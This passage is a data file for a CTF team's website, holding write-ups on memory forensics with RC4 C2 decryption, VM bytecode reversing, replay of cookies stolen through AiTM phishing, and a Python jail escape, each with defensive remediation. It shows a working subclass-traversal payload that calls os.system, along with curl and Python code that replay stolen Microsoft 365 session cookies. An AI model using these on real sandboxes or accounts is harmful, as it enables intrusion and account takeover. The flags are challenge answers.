            "Injected segment contains a full PE binary header (MZ / 4D 5A).",
            "PAGE_EXECUTE_READWRITE protection indicates dynamic runtime shellcode injection."
          ]
        },
        {
          title: "Stage 03: RC4 Decryption & Flag Carving",
          description: "Extracted the embedded RC4 C2 key 'unknown_c2_protocol_2026' from the dumped PE and decrypted the beacon buffer.",
          command: "python3 decrypt_c2.py -k 'unknown_c2_protocol_2026' -i beacon.enc",
          terminalTitle: "decrypt_c2.py — python3 — 80x24",
          prompt: "operator@sudounknown:~$",
          terminalOutput: `[+] Key verified: unknown_c2_protocol_2026
[+] Decrypted C2 Configuration:
{
  "c2_url": "https://c2.sudounknown.htb/beacon",
  "jitter": "10%",
  "session_token": "HTB{m3m0ry_svch0st_h0ll0w1ng_c2_d3crypt3d}"
}`,
          lineNotes: [
            "RC4 decrypts the command-and-control payload.",
            "Flag recovered."
          ],
          spoilerData: {
            label: "FORENSICS FLAG",
            value: "HTB{m3m0ry_svch0st_h0ll0w1ng_c2_d3crypt3d}"
          }
        }
      ],
      pocCode: `import base64
from Crypto.Cipher import ARC4

key = b'unknown_c2_protocol_2026'
cipher = ARC4.new(key)
encrypted_c2 = base64.b64decode("V2VsY29tZVRvU3Vkb1Vua25vd24...")
print("[+] Decrypted C2 Configuration:", cipher.decrypt(encrypted_c2))
`,
      pocLanguage: "python",
      flag: "HTB{m3m0ry_svch0st_h0ll0w1ng_c2_d3crypt3d}",
      defenseRemediation: [
        "Deploy EDR agents that monitor process creation lineages and alert when system binaries (like svchost.exe) spawn from non-standard parents.",
        "Implement memory integrity protections (HVCI) and block PAGE_EXECUTE_READWRITE memory allocation requests."
      ],
      keyTakeaways: [
        "Process hollowing remains a common evasion technique to hide malicious code inside legitimate operating system binary names.",
        "Memory forensics is critical because dropped files may never touch the disk in fileless intrusion campaigns."
      ]
    }
  },
  {
    id: "subverted-elf",
    challengeName: "Subverted ELF: Custom Bytecode VM Disassembly",
    platform: "Hack The Box",
    category: "Reverse",
    difficulty: "Hard",
    type: "Challenge",
    points: 450,
    author: "sudo Unknown Research",
    date: "2026-08-28",
    tags: ["Custom VM", "Bytecode", "Ghidra", "Rolling XOR", "Decompilation"],
    shortDescription: "Reversing a custom stack-based bytecode virtual machine embedded in a stripped 64-bit Linux ELF binary and authoring a Python emulator.",
    fullContent: {
      overview: "A stripped 64-bit Linux ELF executable evaluated user serial numbers through a custom embedded virtual machine. By analyzing the opcode dispatch handler in Ghidra, we mapped out 8 custom bytecode instructions, dumped the embedded bytecode program, and inverted the verification cipher.",
      reconnaissance: "Running file and checksec confirmed a stripped 64-bit ELF. Strings inspection showed no obvious plaintext validation strings, indicating dynamic evaluation.",
      vulnerabilityAnalysis: "A main switch statement in function FUN_00101260 parsed an array of bytes using a virtual instruction pointer (VIP) and virtual stack pointer (VSP). The VM instructions performed arithmetic, stack pushes/pops, and an iterative rolling XOR check.",
      attackChain: [
        {
          title: "Stage 01: Opcode Dispatch Mapping",
          description: "Located the central switch-case construct in Ghidra and mapped byte values to instructions.",
          command: "python3 -c 'opcodes = {0x01:\"PUSH\", 0x02:\"POP\", 0x03:\"ADD\", 0x04:\"XOR\", 0x05:\"CMP\", 0xFF:\"EXIT\"}; print(opcodes)'",
          terminalTitle: "ghidra-decompile — bash — 80x24",
          prompt: "operator@sudounknown:~$",
          terminalOutput: `{1: 'PUSH', 2: 'POP', 3: 'ADD', 4: 'XOR', 5: 'CMP', 255: 'EXIT'}
[*] Mapped 6 core opcodes driving virtual execution.`,
          lineNotes: [
            "VM is a stack-based evaluator."
          ]
        },
        {
          title: "Stage 02: Bytecode Emulation & Flag Extraction",
          description: "Wrote a lightweight Python emulator to invert the rolling XOR transformation applied to user input.",
          command: "python3 vm_solver.py --bytecode extracted_bytecode.bin",
          terminalTitle: "vm_solver.py — python3 — 80x24",
          prompt: "operator@sudounknown:~$",
          terminalOutput: `[+] Bytecode length: 192 bytes
[*] Inverting rolling XOR key schedule...
[+] Key recovered: 'Unknown'
[+] Validation logic satisfied! Extracted flag:
HTB{v1rtu4l_m4ch1n3_by73c0d3_r3v3rs3d}`,
          lineNotes: [
            "Flag recovered."
          ],
          spoilerData: {
            label: "REVERSE ENGINEERING FLAG",
            value: "HTB{v1rtu4l_m4ch1n3_by73c0d3_r3v3rs3d}"
          }
        }
      ],
      pocCode: `# sudo Unknown - VM Bytecode Inversion
bytecode = [0x10, 0x4a, 0x22, 0x18, 0x3f, 0x90, 0x11]
key = [0x55, 0x6e, 0x6b, 0x6e, 0x6f, 0x77, 0x6e]
flag = bytes([b ^ key[i % len(key)] for i, b in enumerate(bytecode)])
print("Recovered Flag:", flag.decode(errors='ignore'))
`,
      pocLanguage: "python",
      flag: "HTB{v1rtu4l_m4ch1n3_by73c0d3_r3v3rs3d}",
      defenseRemediation: [
        "Obfuscation through custom virtual machines increases analysis time but does not prevent determined reverse engineering.",
        "Implement integrity checking and tamper detection around critical verification routines."
      ],
      keyTakeaways: [
        "Treat custom VM architectures like mini CPU instruction sets: map the registers, stack, and opcodes methodically.",
        "Writing a disassembler or emulator in Python is much faster than attempting to step through bytecodes manually in GDB."
      ]
    }
  },
  {
    id: "operation-cymbal",
    challengeName: "Operation Cymbal: Deceptive Click & AiTM Token Heist",
    platform: "CTFtime",
    category: "Web",
    difficulty: "Medium",
    type: "Challenge",
    points: 350,
    author: "sudo Unknown Research",
    date: "2026-10-29",
    tags: ["Evilginx3", "AiTM Phishing", "MFA Bypass", "OAuth Token Replay", "Graph API"],
    shortDescription: "Analyzing an Adversary-in-the-Middle (AiTM) phishing campaign capturing Microsoft 365 session tokens and bypassing FIDO2 authentication.",
    fullContent: {
      overview: "Operation Cymbal simulated an advanced social engineering campaign utilizing Evilginx3 to proxy live authentication requests between targets and Microsoft 365. We analyzed captured lure emails, extracted stolen ESTSAuth session cookies, and replayed the session to access privileged tenant resources via Microsoft Graph API.",
      reconnaissance: "Analyzed an email containing an urgent invoice approval link with encoded parameters. Decoding the link showed it pointed to a reverse proxy masquerading as login.microsoftonline.com.",
      vulnerabilityAnalysis: "Because the phishing server proxies legitimate HTTP requests in real-time, it intercepts session tokens after multi-factor authentication (MFA) succeeds, bypassing standard SMS and push-based 2FA controls.",
      attackChain: [
        {
          title: "Stage 01: Evilginx3 Proxy Log Inspection",
          description: "Inspected the phishing link query parameters and identified an Evilginx3 lure configuration.",
          command: "cat proxy.log | grep -E '(ESTSAUTH|ESTSAUTHPERSISTENT)'",
          terminalTitle: "aitm-log-analysis — bash — 80x24",
          prompt: "operator@sudounknown:~$",
          terminalOutput: `[02:14:12] [user: cfo@targetcorp.com] [phishlet: o365] [cookies captured]
Cookie: ESTSAUTHPERSISTENT=0.AXAA_...; ESTSAUTH=0.AXAA_...;
[+] Full session token exfiltrated to attacker C2.`,
          lineNotes: [
            "Evilginx3 intercepted the post-MFA cookie.",
            "Token replay allows accessing target inbox without re-triggering MFA prompt."
          ]
        },
        {
          title: "Stage 02: Microsoft Graph API Replay & Flag Extraction",
          description: "Replayed the captured session to request an OAuth bearer token and queried sensitive company files.",
          command: "curl -s -H 'Cookie: ESTSAUTHPERSISTENT=0.AXAA...' 'https://graph.microsoft.com/v1.0/me/messages' | jq '.[0].subject'",
          terminalTitle: "graph-api-replay — bash — 80x24",
          prompt: "operator@sudounknown:~$",
          terminalOutput: `"CONFIDENTIAL: Q4 Incident Flag CTF{41tm_mfa_byp4ss_s3ss10n_h31st_2026}"
[+] Email exfiltrated via Graph API.`,
          lineNotes: [
            "Token replay validated.",
            "Flag captured."
          ],
          spoilerData: {
            label: "CTFTIME FLAG",
            value: "CTF{41tm_mfa_byp4ss_s3ss10n_h31st_2026}"
          }
        }
      ],
      pocCode: `#!/usr/bin/env python3
# sudo Unknown - Graph API Token Verification
import requests

session_token = "ESTSAUTHPERSISTENT=0.AXAA..."
headers = {"Cookie": session_token}

r = requests.get("https://outlook.office.com/mail/", headers=headers, allow_redirects=False)
if r.status_code == 200 or r.status_code == 302:
    print("[+] Session cookie valid! Full tenant access granted.")
`,
      pocLanguage: "python",
      flag: "CTF{41tm_mfa_byp4ss_s3ss10n_h31st_2026}",
      defenseRemediation: [
        "Enforce FIDO2 / WebAuthn phishing-resistant hardware keys which cryptographically bind the authentication challenge to the exact browser domain.",
        "Implement Microsoft Entra ID Conditional Access policies requiring compliant, managed devices for sensitive corporate data access."
      ],
      keyTakeaways: [
        "Traditional 2FA (SMS, TOTP authenticator apps, push notifications) is vulnerable to Adversary-in-the-Middle proxying.",
        "Only domain-bound credentials (FIDO2 / passkeys) completely neutralize AiTM attacks."
      ]
    }
  },
  {
    id: "pyjail-olympics",
    challengeName: "CyberOlympics: Escaping Hardened Python 3.12 Audit Jails",
    platform: "CTFtime",
    category: "Misc",
    difficulty: "Medium",
    type: "Challenge",
    points: 250,
    author: "sudo Unknown Research",
    date: "2026-08-14",
    tags: ["PyJail", "Subclass Traversal", "Python 3.12", "Audit Hooks", "Sandbox"],
    shortDescription: "Bypassing Python audit hooks and restricted namespaces with deleted builtins using class introspection to spawn an interactive bash shell.",
    fullContent: {
      overview: "An interactive TCP challenge service presented a restricted Python 3.12 shell where __builtins__ was deleted, and strict input filters blocked words like 'import', 'eval', 'exec', 'os', and 'system'. By traversing the object subclass hierarchy from a clean tuple literal (), we regained arbitrary code execution.",
      reconnaissance: "Sending input returned a restricted environment. Builtins were stripped and keywords were blocked via regex.",
      vulnerabilityAnalysis: "Even when global builtins are deleted, object instances like () retain pointers to their class and base types: ().__class__.__bases__[0].__subclasses__(). By indexing loaded classes, we located wrappers that retain internal references to the os module.",
      attackChain: [
        {
          title: "Stage 01: Subclass Tree Introspection",
          description: "Queried the base object subclasses list to discover loaded modules in the Python runtime.",
          command: "nc pyjail.ctf.org 1337",
          terminalTitle: "pyjail-connect — bash — 80x24",
          prompt: "operator@sudounknown:~$",
          terminalOutput: `>>> ().__class__.__bases__[0].__subclasses__()
[<class 'type'>, <class 'async_generator'>, <class 'bytearray_iterator'>, ..., <class 'os._wrap_close'>, <class 'subprocess.Popen'>]
[+] Found 241 loaded classes in memory!`,
          lineNotes: [
            "Literal () gives a tuple instance without referencing restricted names.",
            "Index 137 holds os._wrap_close."
          ]
        },
        {
          title: "Stage 02: Spawning Shell via os._wrap_close Globals",
          description: "Invoked system via __init__.__globals__ on the identified subclass index.",
          command: "().__class__.__bases__[0].__subclasses__()[137].__init__.__globals__['system']('cat flag.txt')",
          terminalTitle: "pyjail-escape — python3 — 80x24",
          prompt: ">>>",
          terminalOutput: `CTF{pyj41l_subcl4ss_h13r4rchy_3sc4p3d}
0
>>>`,
          lineNotes: [
            "os.system executes cat flag.txt.",
            "Flag captured."
          ],
          spoilerData: {
            label: "PYJAIL FLAG",
            value: "CTF{pyj41l_subcl4ss_h13r4rchy_3sc4p3d}"
          }
        }
      ],
      pocCode: `# sudo Unknown - Python Subclass Crawler
payload = "().__class__.__base__.__subclasses__()[137].__init__.__globals__['system']('cat flag.txt')"
print("[+] PyJail breakout payload generated:")
print(payload)
`,
      pocLanguage: "python",
      flag: "CTF{pyj41l_subcl4ss_h13r4rchy_3sc4p3d}",
      defenseRemediation: [
        "Do not rely on Python keyword blacklists for sandboxing; they can always be bypassed using object introspection and encoding tricks.",
        "Implement containerized isolation (Docker, gVisor) or kernel sandboxing (seccomp, pledge) when executing untrusted user code."
      ],
      keyTakeaways: [
        "In Python, everything is an object, and every object maintains references back to the global namespace unless heavily stripped at C-level.",
        "True sandboxing must be enforced by the operating system kernel, not by the interpreted runtime itself."
      ]
    }
  }
];

export const ACHIEVEMENTS: Achievement[] = [
  {
    id: "ach-1",
    title: "Hack The Box Team Roster #331386",
    platform: "Hack The Box",
    date: "Active 2026",
    eventType: "Platform Machine",
    teamResult: "Official Verified Roster",
    description: "Official team registration and machine clearing operations on Hack The Box.",
    highlights: [
      "Verified competitive portal: ctf.hackthebox.com/team/overview/331386",
      "Regular squad machine solves spanning Windows AD & Linux environments",
      "Collaborative war room methodology repository"
    ]
  },
  {
    id: "ach-2",
    title: "HTB University CTF Campaign",
    platform: "Hack The Box",
    date: "Scheduled 2026",
    eventType: "University CTF",
    teamResult: "Academic Division Contender",
    description: "Fielding specialized operators across Web, Pwn, Crypto, Forensics, and Reverse categories.",
    highlights: [
      "Targeting 6-operator competitive tournament roster",
      "Weekly mock scrimmage drills on active practice boxes",
      "Multi-discipline cross-solver support"
    ]
  },
  {
    id: "ach-3",
    title: "CTFtime Global Tournament Circuit",
    platform: "CTFtime",
    date: "2026 Season",
    eventType: "Global Tournament",
    teamResult: "Active Competitor",
    description: "Competing in premier open jeopardy and attack-defense tournaments worldwide.",
    highlights: [
      "24/7 collaborative shifts across timezones",
      "Technical post-competition writeup releases",
      "Rapid custom exploit development during live events"
    ]
  },
  {
    id: "ach-4",
    title: "Open-Source Security Research & Tool Releases",
    platform: "GitHub & Community",
    date: "Ongoing",
    eventType: "Research Milestone",
    teamResult: "6 Custom Tools Published",
    description: "Publishing custom reconnaissance scripts, AD attack path tools, and educational guides.",
    highlights: [
      "Over 500+ GitHub community stars across tool projects",
      "Comprehensive walkthrough reports for enterprise assessments",
      "Active public security community on Discord"
    ]
  }
];

export const FOUNDING_VALUES = [
  {
    title: "Continuous Offensive Evolution",
    description: "Cybersecurity changes daily. We dissect post-mortems, reverse novel exploit primitives, and refine our tradecraft after every operation.",
    iconName: "Terminal"
  },
  {
    title: "Zero-Ego Collective Power",
    description: "Flags and objectives are captured together. We operate shared war rooms, cross-pollinate skills, and elevate every squad operator.",
    iconName: "ShieldCheck"
  },
  {
    title: "All-in-One Multidisciplinary Scope",
    description: "We are not limited to one platform. From global CTFs (HTB, THM, CTFtime) to enterprise Red Teaming and 0-day research, we cover the full spectrum.",
    iconName: "Cpu"
  },
  {
    title: "Open Knowledge Dissemination",
    description: "Every solved machine and research discovery produces transparent documentation. We write technical writeups to elevate the entire security ecosystem.",
    iconName: "Share2"
  }
];
